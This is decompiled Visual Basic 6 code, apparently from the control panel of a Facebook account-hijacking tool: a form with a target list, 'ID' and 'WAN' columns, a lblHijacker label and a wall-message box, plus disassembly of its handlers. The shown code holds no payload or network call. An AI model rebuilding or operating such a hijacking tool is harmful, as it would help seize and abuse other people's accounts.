VERSION 5.00
Begin VB.Form frmFacebook
  Caption = "Facebook controller"
  ScaleMode = 1
  AutoRedraw = False
  FontTransparent = True
  Icon = "frmFacebook.frx":0
  LinkTopic = "Form1"
  ClientLeft = 225
  ClientTop = 555
  ClientWidth = 13290
  ClientHeight = 7050
  StartUpPosition = 2 'CenterScreen
  Begin XtremeSuiteControls.ListView lstFacebook
    Left = 0
    Top = 0
    Width = 13215
    Height = 5655
    TabIndex = 0
  End
  Begin XtremeSuiteControls.GroupBox gbFacebook
    Left = 0
    Top = 5760
    Width = 13215
    Height = 1215
    TabIndex = 1
    Begin VB.Timer tmrInfo
      Interval = 1000
      Left = 12720
      Top = 0
    End
    Begin VB.TextBox txtWallMsg
      Left = 2520
      Top = 360
      Width = 8295
      Height = 765
      Text = "Hello!!!\n"
      TabIndex = 2
      MultiLine = -1  'True
      ScrollBars = 2
      MaxLength = 255
    End
    Begin XtremeSuiteControls.PushButton cmdStart
      Left = 11880
      Top = 720
      Width = 1215
      Height = 375
      TabIndex = 4
    End
    Begin XtremeSuiteControls.PushButton cmdStop
      Left = 120
      Top = 720
      Width = 1215
      Height = 375
      TabIndex = 5
    End
    Begin VB.Label lblInfoSel
      Caption = "Selected targets:"
      Index = 0
      Left = 10920
      Top = 240
      Width = 1335
      Height = 255
      TabIndex = 7
      Alignment = 1 'Right Justify
      BackStyle = 0 'Transparent
    End
    Begin VB.Label lblInfoSel
      Caption = "N/A"
      Index = 1
      Left = 12360
      Top = 240
      Width = 735
      Height = 255
      TabIndex = 6
      BackStyle = 0 'Transparent
    End
    Begin VB.Label lblHijacker
      Caption = "Wall message:"
      Index = 8
      Left = 1440
      Top = 360
      Width = 1095
      Height = 255
      TabIndex = 3
    End
  End
  Begin VB.Menu mnuFacebookMenu
    Visible = 0   'False
    Caption = "Menu"
    Begin VB.Menu mnuFacebook
      Index = 0
      Caption = "Copy"
    End
    Begin VB.Menu mnuFacebook
      Index = 1
      Caption = "Save to file"
    End
    Begin VB.Menu mnuFacebook
      Index = 2
      Caption = "-"
    End
    Begin VB.Menu mnuFacebook
      Index = 3
      Caption = "Clear all"
    End
  End
End

Attribute VB_Name = "frmFacebook"


Private sub lstFacebook__8CF4EC
008CF4EC: push ebp
008CF4ED: mov ebp, esp
008CF4EF: sub esp, 0000000Ch
008CF4F2: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
008CF4F7: mov eax, fs:[00h]
008CF4FD: push eax
008CF4FE: mov fs:[00000000h], esp
008CF505: push 00000054h
008CF507: pop eax
008CF508: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CF50D: push ebx
008CF50E: push esi
008CF50F: push edi
008CF510: mov var_0C, esp
008CF513: mov var_08, 0040F988h
008CF51A: mov eax, [ebp+08h]
008CF51D: and eax, 00000001h
008CF520: mov var_04, eax
008CF523: mov eax, [ebp+08h]
008CF526: and al, FEh
008CF528: mov [ebp+08h], eax
008CF52B: mov eax, [ebp+08h]
008CF52E: mov eax, [eax]
008CF530: push [ebp+08h]
008CF533: call [eax+04h]
008CF536: mov eax, [ebp+0Ch]
008CF539: cmp word ptr [eax], 0002h
008CF53D: jnz 008CF617h
008CF543: mov var_50, 80020004h
008CF54A: mov var_58, 0000000Ah
008CF551: mov var_40, 80020004h
008CF558: mov var_48, 0000000Ah
008CF55F: mov var_30, 80020004h
008CF566: mov var_38, 0000000Ah
008CF56D: mov var_20, 80020004h
008CF574: mov var_28, 0000000Ah
008CF57B: push 00000010h
008CF57D: pop eax
008CF57E: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CF583: lea esi, var_58
008CF586: mov edi, esp
008CF588: movsd 
008CF589: movsd 
008CF58A: movsd 
008CF58B: movsd 
008CF58C: push 00000010h
008CF58E: pop eax
008CF58F: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CF594: lea esi, var_48
008CF597: mov edi, esp
008CF599: movsd 
008CF59A: movsd 
008CF59B: movsd 
008CF59C: movsd 
008CF59D: push 00000010h
008CF59F: pop eax
008CF5A0: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CF5A5: lea esi, var_38
008CF5A8: mov edi, esp
008CF5AA: movsd 
008CF5AB: movsd 
008CF5AC: movsd 
008CF5AD: movsd 
008CF5AE: push 00000010h
008CF5B0: pop eax
008CF5B1: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CF5B6: lea esi, var_28
008CF5B9: mov edi, esp
008CF5BB: movsd 
008CF5BC: movsd 
008CF5BD: movsd 
008CF5BE: movsd 
008CF5BF: mov eax, [ebp+08h]
008CF5C2: mov eax, [eax]
008CF5C4: push [ebp+08h]
008CF5C7: call [eax+0000030Ch]
008CF5CD: push eax
008CF5CE: lea eax, var_18
008CF5D1: push eax
008CF5D2: call 00410A84h ; Set (object)
008CF5D7: push eax
008CF5D8: mov eax, [ebp+08h]
008CF5DB: mov eax, [eax]
008CF5DD: push [ebp+08h]
008CF5E0: call [eax+000002BCh]
008CF5E6: fclex 
008CF5E8: mov var_5C, eax
008CF5EB: cmp var_5C, 00000000h
008CF5EF: jnl 8CF60Bh
008CF5F1: push 000002BCh
008CF5F6: push 00448548h
008CF5FB: push [ebp+08h]
008CF5FE: push var_5C
008CF601: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008CF606: mov var_68, eax
008CF609: jmp 8CF60Fh
008CF60B: and var_68, 00000000h
008CF60F: lea ecx, var_18
008CF612: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008CF617: mov var_04, 00000000h
008CF61E: push 008CF62Fh
008CF623: jmp 8CF62Eh
008CF625: lea ecx, var_18
008CF628: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008CF62D: ret 
End Sub

Private sub lstFacebook__8CF475
008CF475: push ebp
008CF476: mov ebp, esp
008CF478: sub esp, 0000000Ch
008CF47B: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
008CF480: mov eax, fs:[00h]
008CF486: push eax
008CF487: mov fs:[00000000h], esp
008CF48E: push 00000008h
008CF490: pop eax
008CF491: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CF496: push ebx
008CF497: push esi
008CF498: push edi
008CF499: mov var_0C, esp
008CF49C: mov var_08, 0040F980h
008CF4A3: mov eax, [ebp+08h]
008CF4A6: and eax, 00000001h
008CF4A9: mov var_04, eax
008CF4AC: mov eax, [ebp+08h]
008CF4AF: and al, FEh
008CF4B1: mov [ebp+08h], eax
008CF4B4: mov eax, [ebp+08h]
008CF4B7: mov eax, [eax]
008CF4B9: push [ebp+08h]
008CF4BC: call [eax+04h]
008CF4BF: mov eax, [ebp+0Ch]
008CF4C2: or word ptr [eax], FFFFh
008CF4C6: mov var_04, 00000000h
008CF4CD: mov eax, [ebp+08h]
008CF4D0: mov eax, [eax]
008CF4D2: push [ebp+08h]
008CF4D5: call [eax+08h]
008CF4D8: mov eax, var_04
008CF4DB: mov ecx, var_14
008CF4DE: mov fs:[00000000h], ecx
008CF4E5: pop edi
008CF4E6: pop esi
008CF4E7: pop ebx
008CF4E8: leave 
008CF4E9: retn 0008h
End Sub

Private sub tmrInfo__8D1094
008D1094: push ebp
008D1095: mov ebp, esp
008D1097: sub esp, 0000000Ch
008D109A: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
008D109F: mov eax, fs:[00h]
008D10A5: push eax
008D10A6: mov fs:[00000000h], esp
008D10AD: mov eax, 000000B0h
008D10B2: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D10B7: push ebx
008D10B8: push esi
008D10B9: push edi
008D10BA: mov var_0C, esp
008D10BD: mov var_08, 0040FA20h
008D10C4: mov eax, [ebp+08h]
008D10C7: and eax, 00000001h
008D10CA: mov var_04, eax
008D10CD: mov eax, [ebp+08h]
008D10D0: and al, FEh
008D10D2: mov [ebp+08h], eax
008D10D5: mov eax, [ebp+08h]
008D10D8: mov eax, [eax]
008D10DA: push [ebp+08h]
008D10DD: call [eax+04h]
008D10E0: movsx eax, word ptr [8F2430h]
008D10E7: test eax, eax
008D10E9: jnz 008D13D5h
008D10EF: cmp [008F2010h], 00000000h
008D10F6: jnz 8D1113h
008D10F8: push 008F2010h
008D10FD: push 00433984h
008D1102: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008D1107: mov var_000000A8, 008F2010h
008D1111: jmp 8D111Dh
008D1113: mov var_000000A8, 008F2010h
008D111D: push 00000000h
008D111F: push 00000001h
008D1121: push 00440E48h
008D1126: push 00000000h
008D1128: push 00000018h
008D112A: mov eax, var_000000A8
008D1130: mov eax, [eax]
008D1132: mov ecx, var_000000A8
008D1138: mov ecx, [ecx]
008D113A: mov ecx, [ecx]
008D113C: push eax
008D113D: call [ecx+00000550h]
008D1143: push eax
008D1144: lea eax, var_24
008D1147: push eax
008D1148: call 00410A84h ; Set (object)
008D114D: push eax
008D114E: lea eax, var_3C
008D1151: push eax
008D1152: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D1157: add esp, 00000010h
008D115A: push eax
008D115B: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D1160: push eax
008D1161: lea eax, var_28
008D1164: push eax
008D1165: call 00410A84h ; Set (object)
008D116A: push eax
008D116B: lea eax, var_4C
008D116E: push eax
008D116F: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D1174: add esp, 00000010h
008D1177: push eax
008D1178: call 00410A90h ; msvbvm60.dll.__vbaI4Var
008D117D: xor ecx, ecx
008D117F: test eax, eax
008D1181: setnle cl
008D1184: neg ecx
008D1186: mov var_80, cx
008D118A: lea eax, var_28
008D118D: push eax
008D118E: lea eax, var_24
008D1191: push eax
008D1192: push 00000002h
008D1194: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008D1199: add esp, 0000000Ch
008D119C: lea eax, var_4C
008D119F: push eax
008D11A0: lea eax, var_3C
008D11A3: push eax
008D11A4: push 00000002h
008D11A6: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008D11AB: add esp, 0000000Ch
008D11AE: movsx eax, word ptr var_80
008D11B2: test eax, eax
008D11B4: jz 008D13D0h
008D11BA: cmp [008F2010h], 00000000h
008D11C1: jnz 8D11DEh
008D11C3: push 008F2010h
008D11C8: push 00433984h
008D11CD: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008D11D2: mov var_000000AC, 008F2010h
008D11DC: jmp 8D11E8h
008D11DE: mov var_000000AC, 008F2010h
008D11E8: push 00000000h
008D11EA: push 00000001h
008D11EC: push 00440E48h
008D11F1: push 00000000h
008D11F3: push 00000018h
008D11F5: mov eax, var_000000AC
008D11FB: mov eax, [eax]
008D11FD: mov ecx, var_000000AC
008D1203: mov ecx, [ecx]
008D1205: mov ecx, [ecx]
008D1207: push eax
008D1208: call [ecx+00000550h]
008D120E: push eax
008D120F: lea eax, var_24
008D1212: push eax
008D1213: call 00410A84h ; Set (object)
008D1218: push eax
008D1219: lea eax, var_3C
008D121C: push eax
008D121D: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D1222: add esp, 00000010h
008D1225: push eax
008D1226: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D122B: push eax
008D122C: lea eax, var_28
008D122F: push eax
008D1230: call 00410A84h ; Set (object)
008D1235: push eax
008D1236: lea eax, var_4C
008D1239: push eax
008D123A: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D123F: add esp, 00000010h
008D1242: push eax
008D1243: call 00410A90h ; msvbvm60.dll.__vbaI4Var
008D1248: mov var_00000094, eax
008D124E: mov var_00000090, 00000001h
008D1258: mov var_18, 00000001h
008D125F: lea eax, var_28
008D1262: push eax
008D1263: lea eax, var_24
008D1266: push eax
008D1267: push 00000002h
008D1269: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008D126E: add esp, 0000000Ch
008D1271: lea eax, var_4C
008D1274: push eax
008D1275: lea eax, var_3C
008D1278: push eax
008D1279: push 00000002h
008D127B: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008D1280: add esp, 0000000Ch
008D1283: jmp 8D1297h
008D1285: mov eax, var_18
008D1288: add eax, var_00000090
008D128E: jo 008D17E6h
008D1294: mov var_18, eax
008D1297: mov eax, var_18
008D129A: cmp eax, var_00000094
008D12A0: jnle 008D13D0h
008D12A6: mov eax, var_18
008D12A9: mov var_64, eax
008D12AC: mov var_6C, 00000003h
008D12B3: cmp [008F2010h], 00000000h
008D12BA: jnz 8D12D7h
008D12BC: push 008F2010h
008D12C1: push 00433984h
008D12C6: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008D12CB: mov var_000000B0, 008F2010h
008D12D5: jmp 8D12E1h
008D12D7: mov var_000000B0, 008F2010h
008D12E1: push 00000000h
008D12E3: push 00000004h
008D12E5: push 00440E58h
008D12EA: push 00000010h
008D12EC: pop eax
008D12ED: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D12F2: lea esi, var_6C
008D12F5: mov edi, esp
008D12F7: movsd 
008D12F8: movsd 
008D12F9: movsd 
008D12FA: movsd 
008D12FB: push 00000001h
008D12FD: push 00000000h
008D12FF: push 00440E48h
008D1304: push 00000000h
008D1306: push 00000018h
008D1308: mov eax, var_000000B0
008D130E: mov eax, [eax]
008D1310: mov ecx, var_000000B0
008D1316: mov ecx, [ecx]
008D1318: mov ecx, [ecx]
008D131A: push eax
008D131B: call [ecx+00000550h]
008D1321: push eax
008D1322: lea eax, var_24
008D1325: push eax
008D1326: call 00410A84h ; Set (object)
008D132B: push eax
008D132C: lea eax, var_3C
008D132F: push eax
008D1330: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D1335: add esp, 00000010h
008D1338: push eax
008D1339: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D133E: push eax
008D133F: lea eax, var_28
008D1342: push eax
008D1343: call 00410A84h ; Set (object)
008D1348: push eax
008D1349: lea eax, var_4C
008D134C: push eax
008D134D: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D1352: add esp, 00000020h
008D1355: push eax
008D1356: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D135B: push eax
008D135C: lea eax, var_2C
008D135F: push eax
008D1360: call 00410A84h ; Set (object)
008D1365: push eax
008D1366: lea eax, var_5C
008D1369: push eax
008D136A: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D136F: add esp, 00000010h
008D1372: push eax
008D1373: call 004108C8h ; msvbvm60.dll.__vbaBoolVar
008D1378: sub ax, FFFFh
008D137C: neg ax
008D137F: sbb eax, eax
008D1381: inc eax
008D1382: neg eax
008D1384: mov var_80, ax
008D1388: lea eax, var_2C
008D138B: push eax
008D138C: lea eax, var_28
008D138F: push eax
008D1390: lea eax, var_24
008D1393: push eax
008D1394: push 00000003h
008D1396: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008D139B: add esp, 00000010h
008D139E: lea eax, var_5C
008D13A1: push eax
008D13A2: lea eax, var_4C
008D13A5: push eax
008D13A6: lea eax, var_3C
008D13A9: push eax
008D13AA: push 00000003h
008D13AC: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008D13B1: add esp, 00000010h
008D13B4: movsx eax, word ptr var_80
008D13B8: test eax, eax
008D13BA: jz 8D13CBh
008D13BC: mov eax, var_1C
008D13BF: add eax, 00000001h
008D13C2: jo 008D17E6h
008D13C8: mov var_1C, eax
008D13CB: jmp 008D1285h
008D13D0: jmp 008D16A3h
008D13D5: cmp [008F2010h], 00000000h
008D13DC: jnz 8D13F9h
008D13DE: push 008F2010h
008D13E3: push 00433984h
008D13E8: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008D13ED: mov var_000000B4, 008F2010h
008D13F7: jmp 8D1403h
008D13F9: mov var_000000B4, 008F2010h
008D1403: and var_64, 00000000h
008D1407: mov var_6C, 00008002h
008D140E: push 00000000h
008D1410: push 0044A9C8h ; COUNT
008D1415: push 00000000h
008D1417: push 0044A9B0h ; lstFiltered
008D141C: mov eax, var_000000B4
008D1422: mov eax, [eax]
008D1424: mov ecx, var_000000B4
008D142A: mov ecx, [ecx]
008D142C: mov ecx, [ecx]
008D142E: push eax
008D142F: call [ecx+00000550h]
008D1435: push eax
008D1436: lea eax, var_24
008D1439: push eax
008D143A: call 00410A84h ; Set (object)
008D143F: push eax
008D1440: lea eax, var_3C
008D1443: push eax
008D1444: call 00410742h ; msvbvm60.dll.__vbaLateMemCallLd
008D1449: add esp, 00000010h
008D144C: push eax
008D144D: lea eax, var_4C
008D1450: push eax
008D1451: call 004107D8h ; msvbvm60.dll.__vbaVarLateMemCallLd
008D1456: add esp, 00000010h
008D1459: push eax
008D145A: lea eax, var_6C
008D145D: push eax
008D145E: call 0041091Ch ; msvbvm60.dll.__vbaVarTstGt
008D1463: mov var_80, ax
008D1467: lea ecx, var_24
008D146A: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008D146F: lea eax, var_4C
008D1472: push eax
008D1473: lea eax, var_3C
008D1476: push eax
008D1477: push 00000002h
008D1479: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008D147E: add esp, 0000000Ch
008D1481: movsx eax, word ptr var_80
008D1485: test eax, eax
008D1487: jz 008D16A3h
008D148D: cmp [008F2010h], 00000000h
008D1494: jnz 8D14B1h
008D1496: push 008F2010h
008D149B: push 00433984h
008D14A0: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008D14A5: mov var_000000B8, 008F2010h
008D14AF: jmp 8D14BBh
008D14B1: mov var_000000B8, 008F2010h
008D14BB: push 00000000h
008D14BD: push 00000001h
008D14BF: push 00440E48h
008D14C4: push 00000000h
008D14C6: push 00000018h
008D14C8: mov eax, var_000000B8
008D14CE: mov eax, [eax]
008D14D0: mov ecx, var_000000B8
008D14D6: mov ecx, [ecx]
008D14D8: mov ecx, [ecx]
008D14DA: push eax
008D14DB: call [ecx+0000054Ch]
008D14E1: push eax
008D14E2: lea eax, var_24
008D14E5: push eax
008D14E6: call 00410A84h ; Set (object)
008D14EB: push eax
008D14EC: lea eax, var_3C
008D14EF: push eax
008D14F0: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D14F5: add esp, 00000010h
008D14F8: push eax
008D14F9: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D14FE: push eax
008D14FF: lea eax, var_28
008D1502: push eax
008D1503: call 00410A84h ; Set (object)
008D1508: push eax
008D1509: lea eax, var_4C
008D150C: push eax
008D150D: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D1512: add esp, 00000010h
008D1515: push eax
008D1516: call 00410A90h ; msvbvm60.dll.__vbaI4Var
008D151B: mov var_0000009C, eax
008D1521: mov var_00000098, 00000001h
008D152B: mov var_18, 00000001h
008D1532: lea eax, var_28
008D1535: push eax
008D1536: lea eax, var_24
008D1539: push eax
008D153A: push 00000002h
008D153C: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008D1541: add esp, 0000000Ch
008D1544: lea eax, var_4C
008D1547: push eax
008D1548: lea eax, var_3C
008D154B: push eax
008D154C: push 00000002h
008D154E: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008D1553: add esp, 0000000Ch
008D1556: jmp 8D156Ah
008D1558: mov eax, var_18
008D155B: add eax, var_00000098
008D1561: jo 008D17E6h
008D1567: mov var_18, eax
008D156A: mov eax, var_18
008D156D: cmp eax, var_0000009C
008D1573: jnle 008D16A3h
008D1579: mov eax, var_18
008D157C: mov var_64, eax
008D157F: mov var_6C, 00000003h
008D1586: cmp [008F2010h], 00000000h
008D158D: jnz 8D15AAh
008D158F: push 008F2010h
008D1594: push 00433984h
008D1599: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008D159E: mov var_000000BC, 008F2010h
008D15A8: jmp 8D15B4h
008D15AA: mov var_000000BC, 008F2010h
008D15B4: push 00000000h
008D15B6: push 00000004h
008D15B8: push 00440E58h
008D15BD: push 00000010h
008D15BF: pop eax
008D15C0: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008D15C5: lea esi, var_6C
008D15C8: mov edi, esp
008D15CA: movsd 
008D15CB: movsd 
008D15CC: movsd 
008D15CD: movsd 
008D15CE: push 00000001h
008D15D0: push 00000000h
008D15D2: push 00440E48h
008D15D7: push 00000000h
008D15D9: push 00000018h
008D15DB: mov eax, var_000000BC
008D15E1: mov eax, [eax]
008D15E3: mov ecx, var_000000BC
008D15E9: mov ecx, [ecx]
008D15EB: mov ecx, [ecx]
008D15ED: push eax
008D15EE: call [ecx+0000054Ch]
008D15F4: push eax
008D15F5: lea eax, var_24
008D15F8: push eax
008D15F9: call 00410A84h ; Set (object)
008D15FE: push eax
008D15FF: lea eax, var_3C
008D1602: push eax
008D1603: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D1608: add esp, 00000010h
008D160B: push eax
008D160C: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D1611: push eax
008D1612: lea eax, var_28
008D1615: push eax
008D1616: call 00410A84h ; Set (object)
008D161B: push eax
008D161C: lea eax, var_4C
008D161F: push eax
008D1620: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D1625: add esp, 00000020h
008D1628: push eax
008D1629: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008D162E: push eax
008D162F: lea eax, var_2C
008D1632: push eax
008D1633: call 00410A84h ; Set (object)
008D1638: push eax
008D1639: lea eax, var_5C
008D163C: push eax
008D163D: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008D1642: add esp, 00000010h
008D1645: push eax
008D1646: call 004108C8h ; msvbvm60.dll.__vbaBoolVar
008D164B: sub ax, FFFFh
008D164F: neg ax
008D1652: sbb eax, eax
008D1654: inc eax
008D1655: neg eax
008D1657: mov var_80, ax
008D165B: lea eax, var_2C
008D165E: push eax
008D165F: lea eax, var_28
008D1662: push eax
008D1663: lea eax, var_24
008D1666: push eax
008D1667: push 00000003h
008D1669: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008D166E: add esp, 00000010h
008D1671: lea eax, var_5C
008D1674: push eax
008D1675: lea eax, var_4C
008D1678: push eax
008D1679: lea eax, var_3C
008D167C: push eax
008D167D: push 00000003h
008D167F: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008D1684: add esp, 00000010h
008D1687: movsx eax, word ptr var_80
008D168B: test eax, eax
008D168D: jz 8D169Eh
008D168F: mov eax, var_1C
008D1692: add eax, 00000001h
008D1695: jo 008D17E6h
008D169B: mov var_1C, eax
008D169E: jmp 008D1558h
008D16A3: mov eax, [ebp+08h]
008D16A6: mov eax, [eax]
008D16A8: push [ebp+08h]
008D16AB: call [eax+00000304h]
008D16B1: push eax
008D16B2: lea eax, var_24
008D16B5: push eax
008D16B6: call 00410A84h ; Set (object)
008D16BB: mov var_80, eax
008D16BE: lea eax, var_28
008D16C1: push eax
008D16C2: push 00000001h
008D16C4: mov eax, var_80
008D16C7: mov eax, [eax]
008D16C9: push var_80
008D16CC: call [eax+40h]
008D16CF: fclex 
008D16D1: mov var_00000084, eax
008D16D7: cmp var_00000084, 00000000h
008D16DE: jnl 8D16FDh
008D16E0: push 00000040h
008D16E2: push 00440DE8h
008D16E7: push var_80
008D16EA: push var_00000084
008D16F0: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008D16F5: mov var_000000C0, eax
008D16FB: jmp 8D1704h
008D16FD: and var_000000C0, 00000000h
008D1704: mov eax, var_28
008D1707: mov var_00000088, eax
008D170D: push var_1C
008D1710: call 00410A1Eh ; msvbvm60.dll.__vbaStrI4
008D1715: mov edx, eax
008D1717: lea ecx, var_20
008D171A: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008D171F: push eax
008D1720: mov eax, var_00000088
008D1726: mov eax, [eax]
008D1728: push var_00000088
008D172E: call [eax+54h]
008D1731: fclex 
008D1733: mov var_0000008C, eax
008D1739: cmp var_0000008C, 00000000h
008D1740: jnl 8D1762h
008D1742: push 00000054h
008D1744: push 004425E4h
008D1749: push var_00000088
008D174F: push var_0000008C
008D1755: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008D175A: mov var_000000C4, eax
008D1760: jmp 8D1769h
008D1762: and var_000000C4, 00000000h
008D1769: lea ecx, var_20
008D176C: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
008D1771: lea eax, var_28
008D1774: push eax
008D1775: lea eax, var_24
008D1778: push eax
008D1779: push 00000002h
008D177B: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008D1780: add esp, 0000000Ch
008D1783: mov var_04, 00000000h
008D178A: push 008D17C7h
008D178F: jmp 8D17C6h
008D1791: lea ecx, var_20
008D1794: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
008D1799: lea eax, var_2C
008D179C: push eax
008D179D: lea eax, var_28
008D17A0: push eax
008D17A1: lea eax, var_24
008D17A4: push eax
008D17A5: push 00000003h
008D17A7: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008D17AC: add esp, 00000010h
008D17AF: lea eax, var_5C
008D17B2: push eax
008D17B3: lea eax, var_4C
008D17B6: push eax
008D17B7: lea eax, var_3C
008D17BA: push eax
008D17BB: push 00000003h
008D17BD: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008D17C2: add esp, 00000010h
008D17C5: ret 
End Sub

Private sub Form__8CE881
008CE881: push ebp
008CE882: mov ebp, esp
008CE884: sub esp, 0000000Ch
008CE887: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
008CE88C: mov eax, fs:[00h]
008CE892: push eax
008CE893: mov fs:[00000000h], esp
008CE89A: mov eax, 000000A0h
008CE89F: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CE8A4: push ebx
008CE8A5: push esi
008CE8A6: push edi
008CE8A7: mov var_0C, esp
008CE8AA: mov var_08, 0040F938h
008CE8B1: mov eax, [ebp+08h]
008CE8B4: and eax, 00000001h
008CE8B7: mov var_04, eax
008CE8BA: mov eax, [ebp+08h]
008CE8BD: and al, FEh
008CE8BF: mov [ebp+08h], eax
008CE8C2: mov eax, [ebp+08h]
008CE8C5: mov eax, [eax]
008CE8C7: push [ebp+08h]
008CE8CA: call [eax+04h]
008CE8CD: mov var_34, 80020004h
008CE8D4: mov var_3C, 0000000Ah
008CE8DB: mov var_54, 80020004h
008CE8E2: mov var_5C, 0000000Ah
008CE8E9: mov var_74, 00446714h ; ID
008CE8F0: mov var_7C, 00000008h
008CE8F7: mov var_00000094, 00000384h
008CE901: mov var_0000009C, 00000002h
008CE90B: push 00000010h
008CE90D: pop eax
008CE90E: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CE913: lea esi, var_3C
008CE916: mov edi, esp
008CE918: movsd 
008CE919: movsd 
008CE91A: movsd 
008CE91B: movsd 
008CE91C: push 00000010h
008CE91E: pop eax
008CE91F: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CE924: lea esi, var_5C
008CE927: mov edi, esp
008CE929: movsd 
008CE92A: movsd 
008CE92B: movsd 
008CE92C: movsd 
008CE92D: push 00000010h
008CE92F: pop eax
008CE930: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CE935: lea esi, var_7C
008CE938: mov edi, esp
008CE93A: movsd 
008CE93B: movsd 
008CE93C: movsd 
008CE93D: movsd 
008CE93E: push 00000010h
008CE940: pop eax
008CE941: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CE946: lea esi, var_0000009C
008CE94C: mov edi, esp
008CE94E: movsd 
008CE94F: movsd 
008CE950: movsd 
008CE951: movsd 
008CE952: push 00000004h
008CE954: push 00000002h
008CE956: push 00445534h
008CE95B: push 00000000h
008CE95D: push 00000019h
008CE95F: mov eax, [ebp+08h]
008CE962: mov eax, [eax]
008CE964: push [ebp+08h]
008CE967: call [eax+00000314h]
008CE96D: push eax
008CE96E: lea eax, var_18
008CE971: push eax
008CE972: call 00410A84h ; Set (object)
008CE977: push eax
008CE978: lea eax, var_2C
008CE97B: push eax
008CE97C: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CE981: add esp, 00000010h
008CE984: push eax
008CE985: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008CE98A: push eax
008CE98B: lea eax, var_1C
008CE98E: push eax
008CE98F: call 00410A84h ; Set (object)
008CE994: push eax
008CE995: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
008CE99A: add esp, 0000004Ch
008CE99D: lea eax, var_1C
008CE9A0: push eax
008CE9A1: lea eax, var_18
008CE9A4: push eax
008CE9A5: push 00000002h
008CE9A7: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008CE9AC: add esp, 0000000Ch
008CE9AF: lea ecx, var_2C
008CE9B2: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
008CE9B7: mov var_34, 80020004h
008CE9BE: mov var_3C, 0000000Ah
008CE9C5: mov var_54, 80020004h
008CE9CC: mov var_5C, 0000000Ah
008CE9D3: mov var_74, 00446720h ; WAN
008CE9DA: mov var_7C, 00000008h
008CE9E1: mov var_00000094, 00000708h
008CE9EB: mov var_0000009C, 00000002h
008CE9F5: push 00000010h
008CE9F7: pop eax
008CE9F8: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CE9FD: lea esi, var_3C
008CEA00: mov edi, esp
008CEA02: movsd 
008CEA03: movsd 
008CEA04: movsd 
008CEA05: movsd 
008CEA06: push 00000010h
008CEA08: pop eax
008CEA09: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CEA0E: lea esi, var_5C
008CEA11: mov edi, esp
008CEA13: movsd 
008CEA14: movsd 
008CEA15: movsd 
008CEA16: movsd 
008CEA17: push 00000010h
008CEA19: pop eax
